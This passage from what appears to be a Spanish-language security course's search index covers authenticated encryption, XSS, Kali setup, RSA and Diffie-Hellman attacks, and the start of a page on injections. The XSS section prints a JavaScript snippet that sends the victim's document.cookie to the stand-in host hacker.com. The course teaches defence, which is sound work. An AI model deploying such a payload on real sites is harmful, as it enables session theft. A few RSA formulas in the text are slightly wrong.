cifrado altera solamente un byte del texto plano, una modificación de este estilo podría cambiar el significado del mensaje cifrado en una letra o símbolo. Para evitar este problema, es posible \u0026ldquo;autentificar\u0026rdquo; el mensaje a través de \u0026ldquo;message authentication codes\u0026rdquo; (MACs), los cuales permiten demostrar que el mensaje descifrado no ha sido intervenido de ninguna forma.\u003c/p\u003e\n\u003ch3 id=\"mac\"\u003eMAC\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eMessage Authentication Code\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eMAC es el nombre formal de este código extra que se agrega al mensaje cifrado para comprobar su autenticidad. Existen muchas formas de generar un MAC, a continuación nombramos algunas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eHMAC\u003c/strong\u003e se genera a partir de una función de Hash.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGCM\u003c/strong\u003e se genera a partir del uso de un cifrador de bloque (Gallois-Counter mode).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePoly1305\u003c/strong\u003e utiliza polinomios y una función extra (AES, un generador como ChaCha20) para generar aleatoriedad a partir de una semilla.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"enfoques-de-autentificación\"\u003eEnfoques de autentificación\u003c/h4\u003e\n\u003cp\u003eLa autentificación del mensaje se podría realizar en tres puntos distintos. A continuación se muestran diagramas sobre cada forma de autentificar:\u003c/p\u003e\n\u003ch5 id=\"encrypt-then-mac-etm\"\u003e\u003cstrong\u003eEncrypt-Then-MAC (EtM)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../etm.png\" alt=\"Encrypt Then MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eCorresponde a autentificar el mensaje ya cifrado. Es necesario usar una llave distintas para evitar ataques como \u003ca href=\"https://en.wikipedia.org/wiki/CBC-MAC#Using_the_same_key_for_encryption_and_authentication\"\u003eel que se menciona acá\u003c/a\u003e\u003c/p\u003e\n\u003ch5 id=\"encrypt-and-mac-em\"\u003e\u003cstrong\u003eEncrypt-And-MAC (E\u0026amp;M)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../eam.png\" alt=\"Encrypt And MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso no hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003ch5 id=\"mac-then-encrypt-mte\"\u003e\u003cstrong\u003eMAC-Then-Encrypt (MtE)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../mte.png\" alt=\"MAC then encrypt\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso tampoco hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003cp\u003eMás información sobre cada enfoque se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/Authenticated_encryption#cite_note-14\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"cifrar-y-autentificar-a-la-vez\"\u003eCifrar y autentificar a la vez\u003c/h3\u003e\n\u003cp\u003eExisten ciertos algoritmos para cifrar datos que integran una rutina de autentificación en el proceso de cifrado. Mencionaremos brevemente dos de los más utilizados:\u003c/p\u003e\n\u003ch3 id=\"aes-gcm-bloque\"\u003eAES-GCM (Bloque)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eGalois-Counter Mode\u003c/strong\u003e es un modo de cifrado de bloque que además autentifica el mensaje cifrado. Este modo permite autentificar datos anexos a $P$ que necesiten ser autentificados, pero no cifrados. A esta información adicional no cifrada se le suele denominar $A$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../gcm.png\" alt=\"Galois-Counter Mode\"\u003e\u003c/p\u003e\n\u003cp\u003eMás información sobre el algoritmo de autentificación \u003ca href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\"\u003een Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"chacha20-poly1305-flujo\"\u003eChaCha20-Poly1305 (Flujo)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eChaCha20-Poly1305\u003c/strong\u003e corresponde al uso combinado del cifrador de flujo ChaCha20 y del MAC Poly1305. Su funcionamiento es explicado en el \u003ca href=\"https://tools.ietf.org/html/rfc8439\"\u003eRFC 8439\u003c/a\u003e. Google seleccionó este algoritmo como reemplazo de RC4 en TLS/SSL. Este algoritmo suele preferirse sobre AES-GCM en hardware que no tiene procesadores optimizados para AES.\u003c/p\u003e\n"},{id:17,href:"/docs/apps-web/xss/",title:"Cross-Site Scripting",description:null,content:"\u003cp\u003eEl Cross-Site Scripting, o XSS (punto 7 en el OWASP Top 10), se refiere a una clase de vulnerabilidades que\nintentan introducir código JavaScript en un sitio web, el cual será ejecutado en el navegador de otros usuarios.\nDependiendo de la aplicación en específico, las repercusiones de esto varían desde meras molestias hasta\nla completa ruptura de confidencialidad e integridad del sistema.\u003c/p\u003e\n\u003cp\u003eExisten 3 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAlmacenado\u003c/strong\u003e: El payload queda almacenado en algún lado y no es necesario estar activamente atacando a la víctima.\nUna vez que ella acceda a este, se ejecutará el código malicioso.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReflejado\u003c/strong\u003e: El payload no se almacena permanentemente, sino que viene codificado en alguna variable\n(como un parámetro GET).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDOM\u003c/strong\u003e: Este tipo de XSS no puede ser ejecutado por medio de variables ni datos almacenados, sino que se debe\nrealizar una serie de acciones específicas en el mismo navegador de la víctima.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"javascript\"\u003eJavaScript\u003c/h2\u003e\n\u003cp\u003eJavaScript (JS) es un lenguaje de programación orientado a objetos que usualmente se utiliza para añadir\ncomponentes dinámicas a un sitio web. \u003ca href=\"https://www.w3schools.com/js/DEFAULT.asp\"\u003eAquí\u003c/a\u003e\npueden encontrar un tutorial de JS si lo necesitan.\nEl código JS en una página se ejecuta en el navegador del usuario, no en el servidor.\nExisten varias formas \u003cem\u003e\u0026ldquo;oficiales\u0026rdquo;\u003c/em\u003e de insertar JS en un sitio. El primero es tener el código directamente en\nel HTML, delimitado por tags \u003ccode\u003e\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;\u003c/code\u003e, por ejemplo:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;script\u0026gt;\n            ...code...\n        \u0026lt;/script\u0026gt;\n    \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLa otra forma es hacer una referencia a un archivo que contenga el código, como por ejemplo:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;script src=\u0026quot;/code.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n    \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFinalmente, se puede introducir JS bajo ciertos eventos, como \u003ccode\u003eonclick\u003c/code\u003e, \u003ccode\u003eonerror\u003c/code\u003e, \u003ccode\u003eonmouseover\u003c/code\u003e, etc.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;button onclick=\u0026quot;...code...\u0026quot;\u0026gt;\u0026lt;/button\u0026gt;\n    \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eExisten otras formas de introducir código JS a un sitio web, pero se utilizan más que nada en ataques donde las\nformas comunes están siendo bloqueadas o filtradas. Estas se escapan del ámbito de este curso, pero si están\ninteresados, pueden revisar la\n\u003ca href=\"https://owasp.org/www-community/xss-filter-evasion-cheatsheet\"\u003eguía de evasión de filtros XSS\u003c/a\u003e de OWASP.\u003c/p\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003eUno de los usos más peligrosos de este tipo de ataques es el robo de sesiones. El código introducido toma la\ncookie de sesión de la víctima y se la envía al atacante. Luego él puede simplemente copiar esta cookie en\nsu navegador, con lo cual obtiene acceso autenticado como la víctima. El código a continuación logra hacer esto:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003evar xhr = new XMLHttpRequest();\nxhr.open(\u0026quot;POST\u0026quot;, \u0026quot;https://hacker.com/\u0026quot;, true);\nxhr.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/x-www-form-urlencoded\u0026quot;);\nxhr.send(\u0026quot;cookie=\u0026quot; + document.cookie);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOtro uso es el Cross-Site Request Forgery (CSRF). Estos ataques intentan impersonar a la víctima, enviando\nconsultas en su nombre. Esto funciona ya que las consultas hechas a través de JavaScript también llevan las cookies\ny parámetros de sesión del usuario, por lo que el atacante tiene el potencial de ganar los mismos permisos que\nla víctima. Esto se podría utilizar, por ejemplo, para realizar acciones en nombre del administrador, con lo cual\ncrear otro usuario con permisos de administrador.\u003c/p\u003e\n"},{id:18,href:"/docs/reversa/deobfuscation/",title:"Deobfuscación de Binarios",description:null,content:"\u003cp\u003eLa deobfuscación de binarios es similar a la deobfuscación de JavaScript que vimos en los capítulos de\nesteganografía y aplicaciones web. La diferencia siendo que el código ahora está compilado,\ny por lo tanto las operaciones utilizadas para obfuscar la funcionalidad pueden estar a nivel de microcódigo.\u003c/p\u003e\n"},{id:19,href:"/docs/anexos/kali/",title:"Kali Linux",description:null,content:"\u003cp\u003ePara facilitar tanto al equipo docente como a los estudiantes la solución de problemas relacionados con el ambiente de trabajo durante el transcurso de las actividades del curso, requerimos que utilicen \u003cstrong\u003eKali Linux\u003c/strong\u003e para resolver las tareas y los ejercicios propuestos. A continuación, les explicamos dos formas en las que pueden usar Kali Linux en su computador sin tener que hacer cambios importantes o irreversibles a su configuración actual.\u003c/p\u003e\n\u003ch2 id=\"instalación-en-máquina-virtual-virtualbox\"\u003eInstalación en Máquina Virtual (Virtualbox)\u003c/h2\u003e\n\u003cp\u003eRecomendamos este método para personas con computadores con 8GB o más de RAM, además de al menos 25 GB libres en el disco duro.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePrimero, instala \u003ca href=\"https://www.virtualbox.org/wiki/Downloads\"\u003eVirtualBox\u003c/a\u003e en tu computador. Las instrucciones para hacer esto varían según tu sistema operativo.\u003c/li\u003e\n\u003cli\u003eMientras tanto, baja la imagen de máquina virtual oficial de Kali Linux desde \u003ca href=\"https://images.kali.org/virtual-images/kali-linux-2021.1-vbox-amd64.ova\"\u003eacá\u003c/a\u003e (Enlace viene de \u003ca href=\"https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download\"\u003eesta página\u003c/a\u003e)\u003c/li\u003e\n\u003cli\u003eDespués de instalar VirtualBox, es recomendable instalar el pack de extensiones. Está disponible en el mismo link de descarga de VirtualBox, en la sección VirtualBox Oracle VM VirtualBox Extension Pack. Esto es principalmente para que la máquina virtual use la resolución de pantalla de la ventana en la que está, y no tengamos solo un cuadro pequeño para ver.\u003c/li\u003e\n\u003cli\u003eUna vez esté instalado el programa y haya terminado de bajar la imagen, haz doble click en la segunda. Si el doble click no te sirve, ve a \u0026ldquo;File\u0026rdquo; y luego a \u0026ldquo;Import Appliance\u0026rdquo; en el menú superior, de forma de seleccionar el archivo descargado.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../virtualbox_1.jpg\" alt=\"\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLuego, en el cuaddro para importar la máquina, hacer click en \u0026ldquo;Import\u0026rdquo; y aceptar la licencia asociada. El proceso de importación demorará unos minutos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUna vez importada, la máquina se puede correr haciendo doble click en ella. El usuario y la contraseña son \u003ccode\u003ekali\u003c/code\u003e y \u003ccode\u003ekali\u003c/code\u003e respectivamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"instalación-en-un-pendrive-persistente\"\u003eInstalación en un pendrive persistente\u003c/h2\u003e\n\u003cp\u003eEste procedimiento es un poco más largo y complejo que el de la máquina virtual, pero debiesen obtener un rendimiento mucho mejor. Además, no usarán espacio de su disco principal, ya que correrán todo el sistema operativo Kali desde un pendrive. Lo anterior también les da la ventaja de poder mantener su sesión de Kali entre distintos computadores.\u003c/p\u003e\n\u003cp\u003eLes recomendamos usar un pendrive USB 3, con 8 GB de espacio o más. Lamentablemente, el pendrive que usen para esto no podrán usarlo para otras cosas, pero a futuro pueden formatearlo y recuperar su anterior utilidad.\u003c/p\u003e\n\u003cp\u003eLas instrucciones detalladas para crear un pendrive persistente se encuentran \u003ca href=\"https://www.kali.org/docs/usb/usb-persistence/\"\u003een este tutorial oficial\u003c/a\u003e.\u003c/p\u003e\n"},{id:20,href:"/docs/cripto-moderna/cripto-asimetrica/",title:"Criptografía Asimétrica",description:null,content:"\u003cp\u003e\u003cimg src=\"../public_key_crypto.png\" alt=\"Criptografía de llave pública\"\u003e\u003c/p\u003e\n\u003cp\u003eLa \u003cstrong\u003ecriptografía asimétrica\u003c/strong\u003e o \u003cstrong\u003ecriptografía de llave pública\u003c/strong\u003e se diferencia de la criptografía simétrica en que se usan llaves distintas para cifrar y descifrar mensajes, lo que hace posible publicar la llave de cifrado  con el objetivo de que otras personas puedan enviarnos mensajes que solo nosotros podremos descifrar, usando la llave de descifrado. Algo similar ocurre con la criptografía asimétrica usada para firmas digitales. Se usa una llave para \u0026ldquo;demostrar\u0026rdquo; que un mensaje fue enviado por nosotros mientras se publica la otra para que cualquiera pueda comprobar que la firma es válida.\u003c/p\u003e\n\u003cp\u003eEn general, estos sistemas usan propiedades aritméticas para crear problemas matemáticos que son muy difíciles de resolver con información limitada, pero que conociendo un parámetro secreto puedes resolver de forma fácil.\u003c/p\u003e\n\u003ch2 id=\"rsa\"\u003eRSA\u003c/h2\u003e\n\u003ch3 id=\"cifrado\"\u003eCifrado\u003c/h3\u003e\n\u003cp\u003eFue el primer esquema de cifrado de llave pública. Se destaca por el uso de aritmética modular, definiendo los siguientes parámetros:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e$n$ es un número formado por la multiplicación de dos números primos obtenidos al azar $p$ y $q$.\u003c/li\u003e\n\u003cli\u003e$Z_n^*$ es un grupo multiplicativo de enteros módulo $n$.\u003c/li\u003e\n\u003cli\u003e$x$ es nuestro \u003cstrong\u003emensaje en texto plano\u003c/strong\u003e, codificado como un número perteneciente a $Z_n^*$. Debido a lo anterior, el tamaño de nuestro mensaje se encuentra limitado por la magnitud de $n$ (o sea, mientras más grande queramos que sea el mensaje a cifrar, más grande debe ser n).\u003c/li\u003e\n\u003cli\u003e$e$ es nuestro \u003cstrong\u003eexponente público\u003c/strong\u003e y corresponde a un número menor que $(p-1)(q-1)$.\u003c/li\u003e\n\u003cli\u003e$d$ es el inverso multiplicativo de e en el grupo $Z_n^*$, o sea, $d = 1/e \\mod n$.\u003c/li\u003e\n\u003cli\u003e$y$ es nuestro \u003cstrong\u003emensaje cifrado\u003c/strong\u003e y se calcula como $x^e \\mod n$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003cstrong\u003eLlave pública\u003c/strong\u003e en RSA es el par de elementos $(n, e)$, mientras que la \u003cstrong\u003ellave privada\u003c/strong\u003e es el valor $d$.\u003c/p\u003e\n\u003cp\u003eLa gracia de saber que $n=pq$ es que esto nos permite calcular $d$ de forma eficiente, usando el \u003ca href=\"https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm\"\u003ealgoritmo euclidiano extendido\u003c/a\u003e:\u003c/p\u003e\n\u003cp\u003e$extended_gcd(a,b) = ax + by$\u003c/p\u003e\n\u003cp\u003eEn el algoritmo anterior, el valor de $d$ es igual al valor de $a$ al ejecutar $extended_gcd(e, (p-1)(q-1))$.\u003c/p\u003e\n\u003cp\u003eLes recomendamos leer el capítulo 10 del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e para entender por qué ocurre esto.\u003c/p\u003e\n\u003ch4 id=\"cifrado-y-descifrado-en-rsa\"\u003eCifrado y descifrado en RSA\u003c/h4\u003e\n\u003cp\u003ePara cifrar un mensaje en RSA, basta con calcular $y = x^e$, mientras que para descifrar el mensaje, basta con calcular $y^d$, ya que como $d$ es el inverso de $e$, $y^d = x^{e^d} = x^{ed} = x$.\u003c/p\u003e\n\u003cp\u003eEn varias implementaciones, se suele fijar el valor de $e$ a un número pequeño, como por ejemplo $2^16+1$ *(65537), aunque también podría usarse $3$ o $17$ si se usa el padding adecuado (ver sección siguiente para más detalles).\u003c/p\u003e\n\u003ch4 id=\"problemas-de-seguridad-en-rsa\"\u003eProblemas de seguridad en RSA\u003c/h4\u003e\n\u003cp\u003eUna mala implementación de RSA puede generar problemas de seguridad que permitirían incluso descifrar un mensaje. A continuación mencionamos algunos de ellos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e$n$ muy pequeño\u003c/strong\u003e: En general, se suele usar un $n$ de tamaño 2048 bits o más para que el nivel de seguridad del valor cifrado sea similar a un cifrado con llave simétrica de 112 bits. En la práctica, un $n$ de tamaño 300 bits o menos, éste es fácilmente factorizable en un computador de uso personal.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e$e$ muy pequeño y mensajes sin padding\u003c/strong\u003e: Si $e$ es un valor muy pequeño, $x \u0026lt; n^d$ y el mensaje cifrado $y$ no tiene \u003ccode\u003epadding\u003c/code\u003e, es posible calcular la raíz $e$ésima de $y$ para calcular $x$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMala generación de números primos\u003c/strong\u003e: Es muy importante que los números primos $p$ y $q$ se generen de forma aleatoria. En caso que esto no sea así, se corre el riesgo de encontrarlos, y con esto poder derivar el valor secreto $d$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProblemas de maleabilidad en valores cifrados\u003c/strong\u003e: Supongamos que ciframos con la misma llave pública dos valores pequeños $x_1$ y $x_2$, obteniéndose $y_1$ e $y_2$ respectivamente. Si $y_1y_2 \u0026lt; n$, una persona externa podría calcular el valor cifrado de $x_1x_2$ simplemente multiplicando los valores cifrados de $x_1$ y $x_2$. Para evitar este problema, se suele aplicar un \u003ccode\u003epadding\u003c/code\u003e especial a todos los valores cifrados con RSA, de forma que su representación numérica corresponda a un número grande.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eComputación Cuántica\u003c/strong\u003e El problema de factorización en el cual se basa la seguridad de RSA es resolvible en tiempo polinomial con computadores cuánticos usando el \u003ca href=\"https://en.wikipedia.org/wiki/Shor%27s_algorithm\"\u003ealgoritmo de Shor\u003c/a\u003e. Afortunadamente, todavía no se conoce públicamente la existencia de un computador cuántico con la capacidad de factorizar números del tamaño de los usados en RSA.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003ca href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\"\u003epágina en Wikipedia\u003c/a\u003e menciona con mayor detalle los ataques posibles a RSA, sin embargo, la comprensión de algunos de estos problemas requieren recordar hartos contenidos de teoría de números.\u003c/p\u003e\n\u003ch4 id=\"padding-en-cifrado-rsa-oaep\"\u003ePadding en cifrado RSA: OAEP\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../oaep.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cp\u003eEl diagrama anterior, obtenido del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e, muestra en términos generales el uso de padding en RSA. Uno de los algoritmos de padding más usados en RSA es OAEP, el cual funciona de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../oaep_2.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe genera $M = H || 000 \u0026hellip; 001 || K$ ($||$ significa concatenar), donde $H$ es una constante conocida, seguida de tantos bytes $00$ como sea necesario para que el tamaño de $M$ en bytes sea el mismo que el de $n$, seguido de un byte $01$. Finalmente, se coloca el mensaje original $K$.\u003c/li\u003e\n\u003cli\u003eLa función $Hash1$ recibe de entrada un valor de largo igual al de $H$ y devuelve un valor de largo igual al de $M$. Llamaremos a este valor $A$\u003c/li\u003e\n\u003cli\u003eLa función $Hash2$ recibe de entrada un valor de largo igual al de $M$ y devuelve un valor de largo igual al de $H$. Llamaremos a este valor $B$\u003c/li\u003e\n\u003cli\u003eEl valor paddeado $P$ se construye de la siguiente forma: $P = 00 || B || A$. Este es el valor que se cifra con RSA finalmente.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEl proceso de descifrado requerirá seguir los pasos anteriores en orden inverso, con el objetivo de obtener el verdadero texto plano.\u003c/p\u003e\n\u003ch3 id=\"firmas\"\u003eFirmas\u003c/h3\u003e\n\u003cp\u003eEn el caso de RSA, para un documento M, se define su firma $S = M^d \\mod n$, donde M es el mensaje a firmar. Para verificar la firma, es necesario calcular $S^e \\mod n$ y comparar este valor con el documento recibido.\u003c/p\u003e\n\u003cp\u003eHay que tener en consideración que, al igual que en el caso de cifrado RSA, el tamaño del mensaje a cifrar está limitado por el tamaño de $n$.\u003c/p\u003e\n\u003ch4 id=\"potenciales-ataques-a-las-firmas-rsa\"\u003ePotenciales ataques a las firmas RSA\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFirma de mensajes \u0026ldquo;triviales\u0026rdquo;\u003c/strong\u003e: Si no se usa una función de padding, y existe la posibilidad de querer firmar un mensaje como $0$, $1$ o $n-1$. En todos estos casos, $x^d$ es igual a $x$, por lo que no es necesario conocer $d$ para generar la firma del mensaje.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBlinding Attack\u003c/strong\u003e: Si no se usa una función de padding y se quiere obtener la firma de un mensaje $M$ sin que la persona que firma el mensaje se entere que lo firmó, se le puede pasar un mensaje $R^eM$ para firmarlo. La firma de este mensaje corresponderá a $(R^eM)^d = R^{ed}M^d = RM^d$. Este valor se puede dividir por R de forma de obtener $M^d$, que es la firma del mensaje M.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"padding-en-firmas-rsa\"\u003ePadding en firmas RSA\u003c/h4\u003e\n\u003cp\u003eA continuación se mencionan dos algoritmos de padding que suelen usarse en RSA:\u003c/p\u003e\n\u003ch5 id=\"pss\"\u003ePSS\u003c/h5\u003e\n\u003cp\u003eLamentablemente, no hay demostración de que OAEP es un método de padding seguro para firmas RSA. Sin embargo, existe otro algoritmo de padding para este caso, denominado PSS.\u003c/p\u003e\n\u003cp\u003eLa implementación de PSS es algo compleja, por lo que la enlazaremos solamente: \u003ca href=\"https://web.archive.org/web/20170810025803/http://grouper.ieee.org/groups/1363/P1363a/contributions/pss-submission.pdf\"\u003ereferencia\u003c/a\u003e.\u003c/p\u003e\n\u003ch5 id=\"fdh\"\u003eFDH\u003c/h5\u003e\n\u003cp\u003eFull Domain Hash es una forma más simple de paddear un documento, ya que considera simplemente calcular su hash con alguna función de hashing segura y luego firmar ese valor. Formalmente, no está demostrada su seguridad, pero en la práctica se considera una buena función de padding, debido a que su simplicidad disminuye considerablemente la posibilidad de error en implementación que sí posee PSS.\u003c/p\u003e\n\u003ch2 id=\"acuerdo-de-llaves-diffie-hellman\"\u003eAcuerdo de llaves Diffie-Hellman\u003c/h2\u003e\n\u003cp\u003eEn general se considera que Withfeld Diffie y Martin Hellman son los creadores del concepto de criptografía de llave pública. Ellos crearon también un esquema para acordar una llave compartida entre dos partes, denominado generalmente como \u003ccode\u003eprotocolo Diffie-Hellman\u003c/code\u003e. Este protocolo requiere de los siguientes valores:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn número primo grande $p$ de forma de definir un grupo multiplicativo $Z_p^*$ sobre el cual trabajar.\u003c/li\u003e\n\u003cli\u003eUn número generador $g$, perteneciente a $Z_p^*$. En general se suele usar $g = 2$.\u003c/li\u003e\n\u003cli\u003eCada parte que desea comunicarse debe elegir un número aleatorio en $Z_p^*$. Los denominaremos $a$ y $b$ para $Alicia$ y $Bob$ respectivamente.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn este caso, se consideran como llave pública los valores $g^a$ y $g^b$, y como llave privada los valores $a$ y $b$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../dh.jpg\" alt=\"Diffie Hellman según Serious Cryptography\"\u003e\u003c/p\u003e\n\u003cp\u003ePara obtener el valor compartido que usarán como llave simétrica para comunicarse, primero Alicia envía a Bob el número $g^a$ y Bob envía a Alicia el número $g^b$. Si existiese una persona entre medio observando el intercambio, no tendría como deducir $a$ o $b$ a partir de $g^a$ o $g^b$ (al problema de obtener $x$ a partir de un $g^x \\mod p$ se le conoce como de \u003ca href=\"https://en.wikipedia.org/wiki/Discrete_logarithm\"\u003eel problema del logaritmo discreto\u003c/a\u003e y se considera que no existe un método general de resolución para él).\u003c/p\u003e\n\u003cp\u003eFinalmente, para calcular el secreto compartido, cada parte eleva el valor recibido por su número aleatorio secreto. De esta forma, Alicia obtendrá $g^{a^b} = g^{ab}$, mientras que Bob obtendrá $g^{b^a} = g^{ba} = g^{ab}$. Ahora, ambas partes pueden usar ese valor compartido para cifrar mensajes.\u003c/p\u003e\n\u003ch3 id=\"problemas-de-seguridad-dh\"\u003eProblemas de seguridad DH\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../dh_mitm.jpg\" alt=\"MITM en Diffie Hellman según Serious Cryptography\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMan-In-The-Middle Attack (Ataque de Entidad al medio de la comunicación)\u003c/strong\u003e: DH provee un mecanismo para negociar un valor secreto entre dos partes, pero no tiene en cuenta la necesidad de autentificar que la persona con la que hablas es quien dice ser. Nada evita que una tercera entidad que controle el canal de comunicación (Eva) pueda hacerse pasar por Bob frente a Alice, y por Alice frente a bob, generando dos números aleatorios $c$ y $d$ y sus respectivas llaves públicas $g^c$ y $g^d$. Eva recibiría tanto $g^a$ como $g^b$ y los guardaría, mientras envía $g^c$ y $g^d$ a Alicia y Bob respectivamente. El secreto compartido entre Alicia y Eva será $g^{ac}$ mientras que el secreto compartido entre Bob y Eva será $g^{bd}$. Cada vez que Alicia o Bob envíen un mensaje a Eva, ella podrá descifrarlo usando el secreto del emisor, y luego recifrarlo con el secreto del receptor. Para evitar este problema, se podría firmar la llave pública enviada a la contraparte utilizando algún otro metodo de criptografía de llave pública negociado con anterioridad.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReplay Attacks (Ataques de Repetición)\u003c/strong\u003e: Incluso si se pudiera autenticar el mensaje, no hay forma de demostrar si el mensaje que viene de Alicia fue emitido ahora o fue emitido hace tiempo, pero ahora Eva lo está reenviando. Una forma de evitar este problema es agregando interactividad al protocolo de generación del secreto compartido, por ejemplo, pidiendo recibir un \u0026ldquo;valor de confirmación\u0026rdquo; que utilice tanto la llave pública de Alicia como la de Bob en ese momento para su generación.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso directo de $g^{ab}$ como secreto compartido\u003c/strong\u003e: Sabemos por lo visto que $g^ab$ es un número aleatorio del grupo $Z_p^*$. Sin embargo, esto no significa que sea un número aleatorio (en el sentido que la probabilidad de cada bit de ser 0 o 1 sea la misma), dado que el grupo que forma el generador $g$ podría tener algún sesgo en la codificación de los números generados. Para evitar esta posibilidad, se suele hashear el valor $g^{ab}$ con alguna función resistente a colisiones, como SHA3 o alguna KDF.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-de-curvas-elípticas\"\u003eCriptografía de Curvas Elípticas\u003c/h2\u003e\n\u003cp\u003eLa criptografía de curvas elípticas (ECC) utiliza la estructura algebráica de curvas elípticas sobre cuerpos finitos que puee ser usada tanto para negociación de llaves como para firmas digitales, y tiene la ventaja de que las llaves y firmas producidas en ella suelen ser mucho más pequeñas que las de Diffie-Hellman o RSA, manteniendo el nivel de seguridad. En este curso no trataremos con ellas, pero en caso de querer saber más, recomendamos leer el capítulo 12 del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n"},{id:21,href:"/docs/reversa/ejercicios/",title:"Ejercicios Reversing",description:null,content:"\u003ch2 id=\"decompilación\"\u003eDecompilación\u003c/h2\u003e\n\u003ch2 id=\"deobfuscación\"\u003eDeobfuscación\u003c/h2\u003e\n"},{id:22,href:"/docs/apps-web/inyecciones/",title:"Inyecciones",description:null,content:"\u003cp\u003eEn términos generales, una inyección (punto 1 del OWASP Top 10) es un ataque que intenta confundir al servidor\nde forma que interprete datos como si fueran código. Esto tiene un potencial muy grande de explotación, aunque\nusualmente está restringido por factores como filtros, configuraciones de seguridad y tecnologías usadas.\u003c/p\u003e\n\u003cp\u003eEstos ataques suelen conllevar a filtración de información, pero también puede ser posible crear,\nmodificar y eliminar datos, ejecutar comandos de sistema, enviar requests a otros servidores, y realizar\nuna denegación de servicio (DoS) por la utilización de demasiados recursos. En general ocurren porque el\nservidor no sanitiza correctamente datos controlados por el usuario, para luego utilizarlos directamente en un\nsistema separado con el cual debe 